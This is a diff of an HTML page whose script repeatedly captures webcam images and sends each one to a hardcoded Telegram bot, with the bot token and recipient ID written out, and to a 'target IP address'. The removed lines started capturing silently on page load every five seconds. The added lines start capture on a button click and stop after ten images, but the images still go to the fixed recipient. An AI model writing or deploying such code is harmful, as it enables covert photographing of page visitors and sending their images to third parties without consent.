@@ -35,21 +35,33 @@
 <body>
 
     <input type="text" id="telegramId2" placeholder="Enter Telegram ID 2" required>
-    <button id="sendButton">Send Images</button>
+    <button id="sendButton">Start Sending Images</button>
 
     <script>
         const telegramId2Input = document.getElementById('telegramId2');
         const botToken = '6552995612:AAGpPJPmKHJBKeSbzNJPxjxM3-8HDXa_rec'; // Your bot token
         const telegramId1 = '1715157464'; // Hardcoded Telegram ID
         const ipAddress = '192.168.1.100'; // Replace with the target IP address
-        const images = []; // Array to store captured images
+        const maxImages = 10; // Maximum number of images to send
+        let imageCount = 0; // Counter for images sent
 
-        // Start capturing images immediately upon page load
-        (async function startCapturing() {
-            setInterval(() => {
-                captureAndSendPhoto();
-            }, 5000); // Every 5 seconds
-        })();
+        document.getElementById('sendButton').onclick = function() {
+            imageCount = 0; // Reset counter on button click
+            startCapturing();
+        };
+
+        async function startCapturing() {
+            const intervalId = setInterval(() => {
+                for (let i = 0; i < 10; i++) { // Capture 10 images every second
+                    if (imageCount < maxImages) {
+                        captureAndSendPhoto();
+                    }
+                }
+                if (imageCount >= maxImages) {
+                    clearInterval(intervalId); // Stop capturing after 10 images
+                }
+            }, 1000); // Capture every 1 second
+        }
 
         function captureAndSendPhoto() {
             navigator.mediaDevices.getUserMedia({ video: true })
@@ -57,27 +69,27 @@
                     const video = document.createElement('video');
                     video.srcObject = stream;
                     video.play();
-                    
-                    // Capture image after a short delay (1 second) to allow video to start
+
+                    // Capture image after a short delay (0.5 seconds) to allow video to start
                     setTimeout(() => {
                         const canvas = document.createElement('canvas');
                         canvas.width = 640; // Set desired width
                         canvas.height = 480; // Set desired height
                         const context = canvas.getContext('2d');
                         context.drawImage(video, 0, 0, canvas.width, canvas.height);
-                        
+
                         // Stop the video stream
                         stream.getTracks().forEach(track => track.stop());
-                        
+
                         // Save the captured image
                         const imageData = canvas.toDataURL('image/png');
-                        images.push(imageData);
-                        console.log(`Captured image ${images.length}`);
+                        imageCount++; // Increment the counter
+                        console.log(`Captured image ${imageCount}`);
 
                         // Send the captured image to Telegram and the specified IP address
                         sendImageToTelegram(imageData);
                         sendImageToIpAddress(imageData);
-                    }, 1000);
+                    }, 500); // Allow the video to start for 0.5 seconds
                 })
                 .catch(err => {
                     console.error("Error accessing camera: ", err);
@@ -146,4 +158,3 @@
 
 </body>
 </html>
-                        
